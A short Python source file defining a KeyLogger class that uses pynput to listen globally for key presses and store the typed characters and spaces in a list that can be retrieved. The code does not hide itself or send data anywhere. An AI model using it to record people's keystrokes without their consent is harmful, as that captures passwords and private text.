from pynput import keyboard

class KeyLogger:
    def __init__(self):
        self.keys = []
        self.listener = None
        self.is_logging = False

    def _on_press(self, key):
        try:
            if key.char:
                self.keys.append(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.keys.append(" ")

    def start_logging(self):
        if not self.is_logging:
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()
            self.is_logging = True

    def stop_logging(self):
        if self.listener and self.is_logging:
            self.listener.stop()
            self.is_logging = False

    def get_events(self):
        keys = self.keys[:]
        self.keys.clear()
        return keys
